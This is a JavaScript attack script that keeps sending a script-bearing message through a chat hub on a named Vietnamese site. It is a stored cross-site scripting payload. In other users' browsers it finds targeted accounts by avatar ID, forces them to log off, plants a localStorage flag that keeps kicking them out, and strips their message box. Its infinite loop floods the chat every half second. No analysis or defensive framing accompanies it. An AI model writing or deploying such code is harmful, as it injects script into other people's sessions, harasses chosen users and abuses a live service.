

async function Load_Message() {
    return new Promise(resolve => {
        let check = `<script>
       
        if(localStorage.getItem("banerr") == 'ok'){
            document.getElementById('txtMessage').remove()
            location.reload()
        }
        var user_img = document.querySelector(".nav-account").querySelector("img").src
        if(user_img.includes('1441474') || user_img.includes('1469869')|| user_img.includes('943733')){           
            $.ajax({
                type: "GET",
                url: "https://netchuyen.com/Logoff.aspx",
                success: async function(data) {
                    localStorage.setItem("banerr",'ok')
                    document.getElementById('txtMessage').remove()
                   location.reload()                    
                }
            });
        }
        </script>`
        chatHub.server.send(check)
        setTimeout(resolve,500)
    })
}



async function main(){
    for(i=0;i<=1;i=0){
        await Load_Message()
    }
}

main()

